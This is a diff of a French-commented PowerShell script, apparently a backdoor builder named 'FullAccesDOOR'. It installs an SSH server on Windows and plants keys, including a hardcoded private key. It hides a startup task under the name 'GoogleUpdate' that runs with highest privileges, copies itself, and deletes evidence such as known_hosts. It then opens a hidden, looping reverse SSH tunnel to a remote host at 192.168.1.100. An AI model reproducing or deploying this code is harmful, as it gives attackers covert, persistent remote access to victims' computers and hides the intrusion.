@@ -46,17 +46,12 @@ function installSshd
 
     if ($status_install -match "NotPresent")
     {
-        #Write-Debug "SSHD not installed"
         Add-WindowsCapability -Online -Name "OpenSSH.Server~~~~0.0.1.0"
-        #Write-Debug "Install SSHD in progress..."
         Start-Service -Name sshd -Confirm:$false
-        #Write-Debug "SSHD service started"
         Set-Service -Name sshd -StartupType Automatic
-        #Write-Debug "set SSHD startup automatic"
     }  
     if ($status_install -match "Installed")
     {
-        #Write-Debug "service SSHD already installed"
         if (!(Test-Path -Path "C:\Windows\System32\OpenSSH\sshd.exe") -or !(Test-Path -Path "C:\Windows\System32\OpenSSH\ssh.exe")) 
         {
             Write-Debug "service ssh(d) not correct"
@@ -73,9 +68,7 @@ function installSshd
         $status_lanch = $status_lanch.Status
         if ($status_lanch -notmatch "Running")
         {
-            #Write-Debug "service SSHD not started"
             Start-Service -Name sshd -Confirm:$false
-            #Write-Debug "SSHD service started"
         } else {Write-Debug "service SSHD is already start"}
     }
 }
@@ -179,15 +172,13 @@ creer la key 2 du client si elle n'existe pas
 + puis se connecte au serveur pour ajouter celle-ci dans authorized_keys
 
 .NOTES
-Supprime la key 1 du repertoire content
 #>
 function createKey2OnRemote
 {
     if (!(Test-Path $Global:contentDirectory\key2))#si key 2 n'est pas crée
     {
-        ssh-keygen -t rsa -b 4096 -P "" -f "$Global:contentDirectory\key2"
-        cat $Global:contentDirectory\key2.pub | ssh remote-ssh-client@172.31.155.245 -o StrictHostKeyChecking=no -i "$Global:contentDirectory\key1" 'cat >> ~/.ssh/authorized_keys2'
-        Remove-Item -Path $Global:contentDirectory\key1 -Force 
+        ssh-keygen -t rsa -b 4096 -N '' -f "$Global:contentDirectory\key2"
+        cat $Global:contentDirectory\key2.pub | ssh remote-ssh-client@192.168.1.100 -o StrictHostKeyChecking=no -i "$Global:contentDirectory\key1" 'cat >> ~/.ssh/authorized_keys2'
     } 
 }
 ################################################################################################################################################################################
@@ -197,28 +188,36 @@ task
 
 .DESCRIPTION
 creer la tache pour lancer le programme au demarrage
-+ puis se connecte au serveur pour ajouter celle-ci dans authorized_keys
 
 .NOTES
 #>
 function task
 {
-  $settings = New-ScheduledTaskSettingsSet -Hidden
-  $trigger = New-ScheduledTaskTrigger -AtStartup
-  $principal = New-ScheduledTaskPrincipal -UserId "$currentUser" -RunLevel Highest
-  $actions = New-ScheduledTaskAction -Execute powershell -Argument '-WindowStyle Hidden -F "%localappdata%\content\sc.exe"'
-  $task = New-ScheduledTask -Action $actions -Principal $principal -Trigger $trigger -Settings $settings
+    $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+    $settings = New-ScheduledTaskSettingsSet -Hidden
+    $trigger = New-ScheduledTaskTrigger -AtStartup
+    $principal = New-ScheduledTaskPrincipal -UserId "$currentUser" -RunLevel Highest
+    $actions = New-ScheduledTaskAction -Execute powershell -Argument '-WindowStyle Hidden -F "%localappdata%\content\sc.exe"'
+    $task = New-ScheduledTask -Action $actions -Principal $principal -Trigger $trigger -Settings $settings
 
-  Register-ScheduledTask 'GoogleUpdate' -InputObject $task -User "$currentUser" -Force
-  Start-ScheduledTask 'GoogleUpdate'
+    Register-ScheduledTask 'GoogleUpdate{b54165-e515-b163-o14654-u4524}' -InputObject $task -User "$currentUser" -Force
 }
 ################################################################################################################################################################################
+<#
+.SYNOPSIS
+copyExeOnDevice 
+
+.DESCRIPTION
+utilise l'id du process pour copier l'EXE dans $Global:contentDirectory
+
+.NOTES
+#>
 function copyExeOnDevice 
 {
-    Copy-Item $PSCommandPath $Global:contentDirectory\sc.exe    
+    $pathCurrentFile = (Get-Process -PID $PID).Path
+    Copy-Item $pathCurrentFile $Global:contentDirectory\sc.exe    
 }
 ################################################################################################################################################################################
-
 $privateKey1 = '-----BEGIN OPENSSH PRIVATE KEY-----
 b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAACFwAAAAdzc2gtcn
 NhAAAAAwEAAQAAAgEA1cu3S8T2+Oa0GjYqXMKEXXy4Fg3vqXh3BZbqQ+Ybp6+FR+6ZrbSq
@@ -274,3 +273,56 @@ $pubKey1 = @"
 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDVy7dLxPb45rQaNipcwoRdfLgWDe+peHcFlupD5hunr4VH7pmttKrPY7JY9tdz2JBy8+3IwOXQ7wZWzsWVCSzHY5IkLE24h8W5pezadI8Y6bCs8KQVHIiqWQdl45yfstXGzfWICloSuy4sUBjTF7mr/foLxCikxPpThmEdzDkaBxJt+JX2Gdm0VaMsL7GKzwI2Wh34mpv2h3OgDZ/XDRs6Ombd+knNe8Lw5iiWp0gxPS1gj260HqGF/FNi+K5udIp7IzwcbI4Fg/x7AdlrkVSuPQqUeMCY+XGXVbyPgXozJ2hFJE0kCj72yEyJABuFkdvXR7dfjQdIc2xuOWqrKtuNGmITqedqulyjc58KVceEEiSgAjK38/fQlGmV9wHsKWeWFLuNLNci3yP6vpTXYnV8WdAwa4ksJtFYb06+DmB56HCazziKYurXq9tmTkjDrtazd4fkJdbIdliTnm9rL+p57TE2L8x3Em6s/plcy6nMMsaJzzdNvT3Kfhk9SP2JA3ojddokRIhPTcivXRcR9ffebqQN17TNawHOjmPNDkImjRXkRaNnQdBL6wAD5cQ1KHfnPq+kCGdANjqW3nWcXkENaxHnCjlLCxGv/YQZvmJ8HR7kbAg5xa98EfLzi4ZkiADM2APOr6szLV7zECLCFnsS/TF/GW7U9Q4V8XTJkMZTvQ== default
 "@
 ################################################################################################################################################################################
+
+
+try 
+{
+    installPwsh7
+}
+catch 
+{
+    Write-Error $_
+}
+
+try 
+{
+    installSshd
+}
+catch 
+{
+    Write-Error $_
+}
+
+$Global:contentDirectory = "$env:LOCALAPPDATA/content"
+
+try 
+{
+    createKey1OnRemote
+    createAuthorized_key
+    configSSHD_config
+    createKey2OnRemote
+    task
+}
+catch 
+{
+    Write-Error $_
+}
+try 
+{
+    copyExeOnDevice
+}
+catch 
+{
+    Write-Error $_
+}
+
+Restart-Service -Name sshd -Force
+Remove-Item -Path $Global:contentDirectory\key1 -Force 
+Remove-Item -Path "$env:USERPROFILE/.ssh/known_hosts" -Force -ErrorAction Ignore
+$arg = $ExecutionContext.InvokeCommand.ExpandString('-c "while(1){ `
+    ssh remote-ssh-client@192.168.1.100 -o StrictHostKeyChecking=no -i $Global:contentDirectory\key2 -N -p 22 -R 6666:localhost:22; `
+    sleep 30 `
+}"')
+Start-Process -WindowStyle hidden -FilePath powershell -ArgumentList $arg
+#ssh remote-ssh-client@172.19.125.245 -o StrictHostKeyChecking=no -i "$Global:contentDirectory\key2" -p 22 -R 6666:localhost:22
+#Invoke-PS2EXE C:\Users\gunsa\Desktop\Sc_Powershell\FullAccesDOOR\mainAll.ps1 C:\Users\gunsa\ExercicesPS\sc.exe
